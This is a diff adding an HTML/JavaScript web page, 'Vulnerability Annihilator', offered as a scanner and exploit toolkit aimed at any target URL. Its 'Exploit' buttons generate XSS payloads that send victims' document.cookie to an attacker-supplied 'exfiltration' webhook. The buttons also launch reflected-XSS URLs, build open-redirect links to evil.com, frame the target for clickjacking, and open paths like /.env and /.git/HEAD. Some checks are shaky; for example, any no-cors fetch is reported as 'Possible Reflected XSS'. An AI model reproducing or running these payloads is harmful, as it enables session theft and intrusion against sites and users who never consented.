@@ -1,0 +1,551 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vulnerability Annihilator</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  background:#000;
+  background-image:repeating-radial-gradient(circle at 0 0,rgba(255,255,255,.015) 0 1px,transparent 1px 40px);
+  font-family:system-ui,-apple-system,sans-serif;
+  color:#fff;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+.container{
+  width:100%;
+  max-width:950px;
+  margin:40px auto;
+  padding:30px;
+  border-radius:24px;
+  backdrop-filter:blur(20px);
+  background:rgba(255,255,255,.03);
+  border:1px solid rgba(255,255,255,.1);
+  box-shadow:0 8px 40px rgba(0,0,0,.8);
+}
+h1{font-size:2rem;font-weight:400;letter-spacing:-.5px;margin-bottom:5px}
+.sub{font-size:.85rem;color:#999;margin-bottom:24px}
+.row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px}
+input[type=text],textarea{
+  flex:1;
+  padding:14px 16px;
+  background:rgba(255,255,255,.05);
+  border:1px solid rgba(255,255,255,.15);
+  border-radius:12px;
+  color:#fff;
+  font-family:'JetBrains Mono','Courier New',monospace;
+  font-size:.85rem;
+  outline:none;
+  transition:border .25s;
+  resize:vertical;
+}
+textarea{min-height:90px}
+input:focus,textarea:focus{border-color:rgba(255,255,255,.45)}
+button{
+  background:rgba(255,255,255,.07);
+  border:1px solid rgba(255,255,255,.18);
+  color:#fff;
+  border-radius:12px;
+  padding:12px 28px;
+  font-family:system-ui,sans-serif;
+  font-size:.85rem;
+  cursor:pointer;
+  transition:background .25s,border .25s;
+  white-space:nowrap;
+}
+button:hover{background:rgba(255,255,255,.15)}
+button:disabled{opacity:.45;cursor:not-allowed}
+.progress-bar{
+  height:4px;
+  background:rgba(255,255,255,.08);
+  border-radius:4px;
+  margin-bottom:18px;
+  overflow:hidden;
+  display:none;
+}
+.progress-fill{
+  height:100%;
+  width:0;
+  background:#fff;
+  transition:width .08s linear;
+}
+.status-text{font-size:.8rem;color:#aaa;margin-bottom:10px;display:none}
+.results{margin-top:20px}
+.card{
+  border-left:4px solid;
+  background:rgba(255,255,255,.02);
+  padding:14px 18px;
+  margin-bottom:10px;
+  border-radius:8px;
+}
+.card-header{display:flex;justify-content:space-between;align-items:center;cursor:pointer}
+.card-title{font-weight:600}
+.severity{
+  font-size:.7rem;
+  font-weight:700;
+  text-transform:uppercase;
+  padding:3px 10px;
+  border-radius:20px;
+  letter-spacing:.5px;
+  background:rgba(255,255,255,.08);
+}
+.critical{border-left-color:#fff}
+.high{border-left-color:#ccc}
+.medium{border-left-color:#999}
+.low{border-left-color:#666}
+.details{
+  margin-top:10px;
+  font-family:'JetBrains Mono','Courier New',monospace;
+  font-size:.78rem;
+  color:#ccc;
+  white-space:pre-wrap;
+  word-break:break-all;
+  display:none;
+}
+.card.open .details{display:block}
+.exploit-btn{
+  margin-top:8px;
+  background:rgba(255,255,255,.04);
+  border:1px dashed rgba(255,255,255,.25);
+  border-radius:8px;
+  padding:5px 12px;
+  font-size:.72rem;
+  cursor:pointer;
+  color:#fff;
+}
+.exploit-btn:hover{background:rgba(255,255,255,.2);border-style:solid}
+.summary{
+  margin-top:35px;
+  padding:20px;
+  border-top:1px solid rgba(255,255,255,.1);
+  display:none;
+}
+.summary-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin:15px 0}
+.summary-item{display:flex;justify-content:space-between;padding:8px 0}
+.divider{border-color:rgba(255,255,255,.08);margin:16px 0}
+</style>
+</head>
+<body>
+<div class=container>
+  <h1>Vulnerability Annihilator</h1>
+  <p class=sub>Full-spectrum scanner &amp; exploit toolkit. Works with or without CORS.</p>
+
+  <div class=row>
+    <input type=text id=urlInput placeholder="https://target.com" autocomplete=off>
+    <button id=fetchBtn>Auto-Fetch</button>
+    <button id=scanBtn disabled>Full Scan</button>
+    <button id=cancelBtn disabled>Cancel</button>
+  </div>
+
+  <div class=progress-bar id=progressBar><div class=progress-fill id=progressFill></div></div>
+  <div class=status-text id=statusText></div>
+
+  <details style="margin-bottom:20px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:14px">
+    <summary style="cursor:pointer;color:#ccc;font-size:.9rem">Manual Input (if CORS blocks)</summary>
+    <div style="margin-top:12px">
+      <label style="font-size:.8rem;color:#aaa">Full HTML source of target page:</label>
+      <textarea id=htmlPaste style="margin-top:4px" placeholder="<html>...</html>"></textarea>
+      <label style="font-size:.8rem;color:#aaa;margin-top:10px;display:block">Response headers (one per line, format: Name: value):</label>
+      <textarea id=headersPaste style="margin-top:4px;min-height:60px" placeholder="Content-Type: text/html&#10;X-Frame-Options: deny"></textarea>
+    </div>
+  </details>
+
+  <div class=row>
+    <input type=text id=webhookUrl placeholder="Your webhook URL for exfiltration (optional)">
+  </div>
+
+  <div class=results id=results></div>
+  <div class=summary id=summary></div>
+</div>
+
+<script>
+'use strict';
+
+var state = {
+  targetUrl: '',
+  domain: '',
+  html: '',
+  headers: {},
+  controller: null,
+  signal: null,
+  scanning: false,
+  findings: [],
+  totalSteps: 12,
+  completedSteps: 0,
+  webhook: ''
+};
+
+var SSL_API = 'https://api.hackertarget.com/ssltest/?q=';
+var COMMON_PATHS = ['/.git/HEAD', '/.env', '/wp-config.php.bak', '/backup.sql', '/config.php', '/debug.log', '/phpinfo.php', '/server-status'];
+var COMMON_DIRS = ['/images/', '/css/', '/js/', '/uploads/'];
+var REDIRECT_PARAMS = ['redirect','url','next','return','goto','target','r','u'];
+var LIB_VULN_MAP = {
+  jquery: [{max:'3.5.0',cve:'CVE-2020-11022/CVE-2020-11023',sev:'Medium',exp:'XSS via unsafe jQuery methods'}],
+  angular: [{max:'1.8.0',cve:'CVE-2022-25844',sev:'Medium',exp:'Expression injection if user input is compiled'}],
+  bootstrap: [{max:'4.5.0',cve:'CVE-2019-8331',sev:'Medium',exp:'XSS in tooltips via data attributes'}],
+  react: [{max:'17.0.0',cve:'CVE-2021-23364',sev:'High',exp:'Prototype pollution may lead to RCE'}]
+};
+
+function parseURL(u) {
+  if(!/^https?:\/\//i.test(u)) u='https://'+u;
+  try { var p=new URL(u); return {full:p.toString(),domain:p.hostname,origin:p.origin}; }
+  catch(e) { return null; }
+}
+
+function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function addFinding(name, severity, desc, detail, exploitFn) {
+  state.findings.push({n:name,s:severity,d:desc,dt:detail,ex:exploitFn||null});
+  renderResults();
+}
+
+function renderResults() {
+  var h='';
+  for(var i=0;i<state.findings.length;i++) {
+    var f=state.findings[i];
+    h+='<div class="card '+f.s.toLowerCase()+'" id="card-'+i+'">'
+      +'<div class="card-header" onclick="toggleCard('+i+')">'
+      +'<span class="card-title">'+esc(f.n)+'</span>'
+      +'<span class="severity">'+f.s+'</span></div>'
+      +'<div class="details">'+esc(f.d)+'\n\n'+esc(f.dt)+'</div>';
+    if(f.ex) h+='<button class="exploit-btn" onclick="runExploit('+i+')">Exploit</button>';
+    h+='</div>';
+  }
+  document.getElementById('results').innerHTML=h;
+}
+
+function toggleCard(i) { document.getElementById('card-'+i).classList.toggle('open'); }
+
+function runExploit(i) {
+  var f=state.findings[i];
+  if(f&&f.ex) f.ex();
+}
+
+function updateProgress(inc) {
+  state.completedSteps+=inc||1;
+  var p=Math.min(100,(state.completedSteps/state.totalSteps)*100);
+  document.getElementById('progressFill').style.width=p+'%';
+  document.getElementById('statusText').textContent='Scanning... '+state.completedSteps+'/'+state.totalSteps;
+}
+
+function showSummary() {
+  var s=document.getElementById('summary');
+  if(!state.findings.length){ s.innerHTML='<p>No vulnerabilities found.</p>';s.style.display='block';return;}
+  var c={Critical:0,High:0,Medium:0,Low:0};
+  state.findings.forEach(function(f){c[f.s]++;});
+  var sc=c.Critical*10+c.High*5+c.Medium*2+c.Low*1;
+  s.innerHTML='<h3>Scan Summary</h3><div class="summary-grid">'
+    +'<div class="summary-item"><span>Critical</span><span>'+c.Critical+'</span></div>'
+    +'<div class="summary-item"><span>High</span><span>'+c.High+'</span></div>'
+    +'<div class="summary-item"><span>Medium</span><span>'+c.Medium+'</span></div>'
+    +'<div class="summary-item"><span>Low</span><span>'+c.Low+'</span></div></div>'
+    +'<p>Severity Score: <strong>'+sc+'</strong></p>'
+    +'<p style="font-size:.75rem;color:#999">Webhook: '+(state.webhook||'none')+'</p>';
+  s.style.display='block';
+}
+
+function extractLinks(html,base) {
+  if(!html) return[];
+  var d=new DOMParser().parseFromString(html,'text/html'),links=[];
+  d.querySelectorAll('a[href]').forEach(function(a){
+    try{links.push(new URL(a.getAttribute('href'),base).toString());}catch(e){}
+  });
+  return [...new Set(links)];
+}
+
+function extractScripts(html,base) {
+  if(!html) return[];
+  var d=new DOMParser().parseFromString(html,'text/html'),scripts=[];
+  d.querySelectorAll('script[src]').forEach(function(s){
+    try{scripts.push(new URL(s.getAttribute('src'),base).toString());}catch(e){}
+  });
+  return [...new Set(scripts)];
+}
+
+function getQueryParams(url) {
+  if(!url) return[];
+  var u=new URL(url),p=[];
+  u.searchParams.forEach(function(v,k){p.push({key:k,value:v});});
+  return p;
+}
+
+function compareVersion(a,b) {
+  var pa=a.split('.').map(Number),pb=b.split('.').map(Number);
+  for(var i=0;i<3;i++){if((pa[i]||0)>(pb[i]||0))return 1;if((pa[i]||0)<(pb[i]||0))return-1;}
+  return 0;
+}
+
+/* ---- AUTO FETCH (direct, may be CORS blocked) ---- */
+async function autoFetch() {
+  var input=document.getElementById('urlInput').value.trim();
+  if(!input) return alert('Enter a URL');
+  var p=parseURL(input);
+  if(!p) return alert('Invalid URL');
+  state.targetUrl=p.full;
+  state.domain=p.domain;
+  var btn=document.getElementById('fetchBtn'),st=document.getElementById('statusText');
+  btn.disabled=true;
+  st.style.display='block';
+  st.textContent='Attempting direct fetch...';
+  try {
+    var resp=await fetch(state.targetUrl,{mode:'cors'});
+    state.html=await resp.text();
+    var hdrs={};
+    resp.headers.forEach(function(v,k){hdrs[k.toLowerCase()]=v;});
+    state.headers=hdrs;
+    st.textContent='SUCCESS - HTML and headers captured. You can now run Full Scan.';
+    document.getElementById('scanBtn').disabled=false;
+  } catch(e) {
+    st.textContent='CORS BLOCKED - Paste HTML and headers below, then click Full Scan.';
+    state.html='';
+    state.headers={};
+    document.getElementById('scanBtn').disabled=false;
+  }
+  btn.disabled=false;
+}
+
+/* ---- FULL SCAN ---- */
+async function startScan() {
+  var urlEl=document.getElementById('urlInput'),webhookEl=document.getElementById('webhookUrl');
+  var htmlEl=document.getElementById('htmlPaste'),headersEl=document.getElementById('headersPaste');
+  if(urlEl.value.trim()){
+    var p=parseURL(urlEl.value.trim());
+    if(p){state.targetUrl=p.full;state.domain=p.domain;}
+  }
+  state.html=htmlEl.value||state.html||'';
+  state.headers={};
+  if(headersEl.value.trim()){
+    headersEl.value.split('\n').forEach(function(line){
+      var idx=line.indexOf(':');
+      if(idx>0) state.headers[line.substring(0,idx).trim().toLowerCase()]=line.substring(idx+1).trim();
+    });
+  }
+  state.webhook=webhookEl.value.trim();
+  state.findings=[];
+  document.getElementById('results').innerHTML='';
+  document.getElementById('summary').style.display='none';
+  state.completedSteps=0;
+  document.getElementById('progressFill').style.width='0%';
+  document.getElementById('progressBar').style.display='block';
+  document.getElementById('statusText').style.display='block';
+  document.getElementById('scanBtn').disabled=true;
+  document.getElementById('cancelBtn').disabled=false;
+
+  state.controller=new AbortController();
+  state.signal=state.controller.signal;
+  state.scanning=true;
+
+  try{await runChecks();}
+  catch(e){
+    if(e.name==='AbortError') addFinding('Scan Cancelled','Low','User aborted.','');
+    else addFinding('Scan Error','Critical','Unexpected error.',e.message);
+  } finally {
+    state.scanning=false;
+    document.getElementById('scanBtn').disabled=false;
+    document.getElementById('cancelBtn').disabled=true;
+    document.getElementById('progressBar').style.display='none';
+    document.getElementById('statusText').style.display='none';
+    showSummary();
+  }
+}
+
+async function runChecks() {
+  updateProgress(0);
+  var h=state.html,hdrs=state.headers,bu=state.targetUrl;
+
+  /* 1. Security Headers */
+  if(!hdrs['strict-transport-security'])addFinding('Missing HSTS','Medium','HSTS not set - SSL stripping possible.','Header absent');
+  var csp=hdrs['content-security-policy'];
+  if(!csp)addFinding('Missing CSP','High','No Content-Security-Policy - XSS wide open.','Header absent',function(){
+    var wh=state.webhook||'YOUR_WEBHOOK';
+    prompt('Exploit - Inject this payload:','<img src=x onerror=fetch("'+wh+'?c="+document.cookie)>');
+  });
+  else if(csp.indexOf('unsafe-inline')!==-1||csp.indexOf('unsafe-eval')!==-1)addFinding('Weak CSP','Medium','CSP allows unsafe-inline/unsafe-eval.','CSP: '+csp,function(){
+    var wh=state.webhook||'YOUR_WEBHOOK';
+    prompt('Exploit - Inline script injection:','<script>fetch("'+wh+'?c="+document.cookie)<\/script>');
+  });
+  var xfo=hdrs['x-frame-options'];
+  var fa=csp?csp.match(/frame-ancestors[^;]*/):null;
+  if(!xfo&&!fa)addFinding('No Clickjack Protection','Medium','Page can be framed.','Missing X-Frame-Options and frame-ancestors',function(){
+    var w=window.open('','_blank');
+    w.document.write('<html><body><iframe src="'+state.targetUrl+'" width=100% height=100%></iframe><div style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;z-index:9999" onclick="alert(\'Clickjacked!\')"></div></body></html>');
+    w.document.close();
+  });
+  if(!hdrs['x-content-type-options']||hdrs['x-content-type-options'].toLowerCase()!=='nosniff')addFinding('Missing X-Content-Type-Options','Low','MIME sniffing risk.','Value: '+(hdrs['x-content-type-options']||'none'));
+  if(!hdrs['referrer-policy'])addFinding('Missing Referrer-Policy','Low','Referrer leaks info.','');
+  if(!hdrs['permissions-policy'])addFinding('Missing Permissions-Policy','Low','Browser features unrestricted.','');
+  updateProgress(1);
+
+  /* 2. SSL/TLS */
+  if(state.domain){
+    try{
+      var r=await fetch(SSL_API+encodeURIComponent(state.domain),{signal:state.signal});
+      var t=await r.text();
+      var dm=t.match(/expires in (\d+) days/i),edm=t.match(/expires:\s*([^\n]+)/i);
+      if(dm&&parseInt(dm[1])<30)addFinding('SSL Expiring','High','Certificate expires in '+dm[1]+' days.',t.substring(0,150));
+      else if(edm){
+        var ed=new Date(edm[1]);
+        if(!isNaN(ed)&&Math.ceil((ed-new Date())/86400000)<30)addFinding('SSL Expiring','High','Certificate expires soon.','');
+      }
+      if(/SSLv[23]/i.test(t)||/TLS\s?1\.[01]/i.test(t))addFinding('Weak Protocols','High','SSLv2/3 or TLS 1.0/1.1 supported.','',function(){
+        alert('Exploit: Use sslscan to test downgrade attacks (POODLE, BEAST).');
+      });
+      if(/RC4|DES|3DES|EXPORT|NULL/i.test(t))addFinding('Weak Ciphers','Critical','RC4/DES/3DES/EXPORT ciphers enabled.','',function(){
+        alert('Exploit: Use cipher downgrade to decrypt traffic.');
+      });
+    }catch(e){addFinding('SSL Check Failed','Low','SSL API unreachable.',e.message);}
+  }
+  updateProgress(1);
+
+  /* 3. Cookies */
+  var sc=hdrs['set-cookie'];
+  if(sc){
+    var cookies=Array.isArray(sc)?sc:[sc];
+    cookies.forEach(function(cs){
+      var sec=/secure/i.test(cs),ho=/httponly/i.test(cs),ss=cs.match(/samesite\s*=\s*(\w+)/i);
+      var attrs=[];
+      if(!sec)attrs.push('Missing Secure');
+      if(!ho)attrs.push('Missing HttpOnly');
+      if(ss&&(ss[1].toLowerCase()!=='lax'&&ss[1].toLowerCase()!=='strict'))attrs.push('SameSite='+ss[1]);
+      else if(!ss)attrs.push('Missing SameSite');
+      if(attrs.length){
+        var sev=(!sec||!ho)?'High':'Medium';
+        addFinding('Insecure Cookie',sev,'Cookie: '+cs.split(';')[0],attrs.join(', ')+'\nFull: '+cs,function(){
+          var wh=state.webhook||'YOUR_WEBHOOK';
+          prompt('Cookie theft payload:','<script>fetch("'+wh+'?cookie="+document.cookie)<\/script>');
+        });
+      }
+    });
+  }
+  updateProgress(1);
+
+  /* 4. Open Redirect */
+  if(h){
+    var links=extractLinks(h,bu),cands=[];
+    links.forEach(function(lk){
+      try{
+        var u=new URL(lk);
+        REDIRECT_PARAMS.forEach(function(p){if(u.searchParams.has(p))cands.push({link:lk,param:p});});
+      }catch(e){}
+    });
+    if(cands.length)addFinding('Potential Open Redirect','Medium','Parameters: '+cands.map(function(x){return x.param;}).join(', '),'Manual test needed. CORS limits auto-check.',function(){
+      var c=cands[0],eu=new URL(c.link);
+      eu.searchParams.set(c.param,'https://evil.com');
+      window.open(eu.toString(),'_blank');
+    });
+  }
+  updateProgress(1);
+
+  /* 5. XSS probe */
+  if(bu){
+    var qp=getQueryParams(bu);
+    if(qp.length){
+      var found=false;
+      for(var i=0;i<Math.min(10,qp.length);i++){
+        var p=qp[i],tu=new URL(bu);
+        tu.searchParams.set(p.key,'%22%3E%3Ch1%3EXSS%3C/h1%3E');
+        try{
+          var resp=await fetch(tu.toString(),{mode:'no-cors'});
+          found=true;break;
+        }catch(e){}
+      }
+      if(found)addFinding('Possible Reflected XSS','Critical','GET parameters may reflect input.','Test manually with payload.',function(){
+        var wh=state.webhook||'YOUR_WEBHOOK',pl='"><img src=x onerror=fetch("'+wh+'?c="+document.cookie)>';
+        var eu=new URL(bu);
+        eu.searchParams.set(qp[0].key,pl);
+        window.open(eu.toString(),'_blank');
+      });
+    }
+  }
+  updateProgress(1);
+
+  /* 6. CORS */
+  if(bu){
+    try{
+      var or=await fetch(bu,{method:'OPTIONS',mode:'cors',signal:state.signal});
+      var acao=or.headers.get('Access-Control-Allow-Origin');
+      if(acao==='*')addFinding('CORS Wildcard','High','Allow-Origin: * with credentials = risk.','',function(){
+        alert('Exploit: Host malicious page that fetches '+(state.webhook||'your-webhook'));
+      });
+      else if(acao&&acao!=='null'&&acao!==location.origin)addFinding('CORS Echo','Medium','Origin echoed back.','Value: '+acao);
+    }catch(e){}
+  }
+  updateProgress(1);
+
+  /* 7. Sensitive files */
+  if(bu)addFinding('Sensitive Files Check','Low','Auto-check blocked by CORS. Test these paths manually.','Paths:\n'+COMMON_PATHS.map(function(x){return bu+x;}).join('\n'),function(){
+    COMMON_PATHS.forEach(function(x){window.open(new URL(x,bu).toString(),'_blank');});
+  });
+  updateProgress(1);
+
+  /* 8. JS Libraries */
+  if(h){
+    var scripts=extractScripts(h,bu);
+    for(var j=0;j<scripts.length;j++){
+      var scr=scripts[j].toLowerCase();
+      var lib=scr.indexOf('jquery')!==-1?'jquery':scr.indexOf('angular')!==-1?'angular':scr.indexOf('bootstrap')!==-1?'bootstrap':scr.indexOf('react')!==-1?'react':null;
+      if(!lib||!LIB_VULN_MAP[lib])continue;
+      try{
+        var lr=await fetch(scripts[j],{mode:'cors'});
+        var ct=await lr.text();
+        var vm=ct.match(/(?:v(?:ersion)?\s*)?(\d+\.\d+\.\d+)/i);
+        if(vm){
+          var ver=vm[1];
+          LIB_VULN_MAP[lib].forEach(function(v){if(compareVersion(ver,v.max)<0)addFinding('Outdated '+lib,v.sev,lib+' '+ver+' < '+v.max,'CVEs: '+v.cve,function(){alert('Exploit: '+v.exp);});});
+        }
+      }catch(e){}
+    }
+  }
+  updateProgress(1);
+
+  /* 9. Info disclosure */
+  if(hdrs['server']&&/\d/.test(hdrs['server']))addFinding('Server Version Disclosure','Low','Server: '+hdrs['server'],'');
+  if(hdrs['x-powered-by'])addFinding('X-Powered-By','Low','Tech stack disclosed.','Value: '+hdrs['x-powered-by']);
+  if(hdrs['x-aspnet-version'])addFinding('ASP.NET Version','Low','Version disclosed.','Value: '+hdrs['x-aspnet-version']);
+  updateProgress(1);
+
+  /* 10. Directory listing */
+  if(bu)addFinding('Directory Listing Check','Low','Auto-check blocked. Open directories manually.','',function(){
+    COMMON_DIRS.forEach(function(d){window.open(new URL(d,bu).toString(),'_blank');});
+  });
+  updateProgress(1);
+
+  /* 11. Forms & hidden inputs */
+  if(h){
+    var doc=new DOMParser().parseFromString(h,'text/html');
+    if(doc.querySelectorAll('form').length)addFinding('Forms Detected','Low','Check for CSRF tokens and HTTPS action.','');
+    if(doc.querySelectorAll('input[type=hidden]').length)addFinding('Hidden Inputs','Low','Potential CSRF or tampering surface.','');
+  }
+  updateProgress(1);
+
+  /* 12. Clickjacking iframe test */
+  if(bu){
+    await new Promise(function(resolve){
+      var ifr=document.createElement('iframe');
+      ifr.style.display='none';
+      ifr.src=bu;
+      ifr.onload=resolve;ifr.onerror=resolve;
+      document.body.appendChild(ifr);
+      setTimeout(function(){document.body.removeChild(ifr);resolve();},4000);
+    });
+  }
+  updateProgress(1);
+  showSummary();
+}
+
+/* ---- CANCEL ---- */
+function cancelScan() {
+  if(state.controller)state.controller.abort();
+}
+
+/* ---- EVENT LISTENERS ---- */
+document.getElementById('fetchBtn').addEventListener('click',autoFetch);
+document.getElementById('scanBtn').addEventListener('click',startScan);
+document.getElementById('cancelBtn').addEventListener('click',cancelScan);
+</script>
+</body>
+</html>
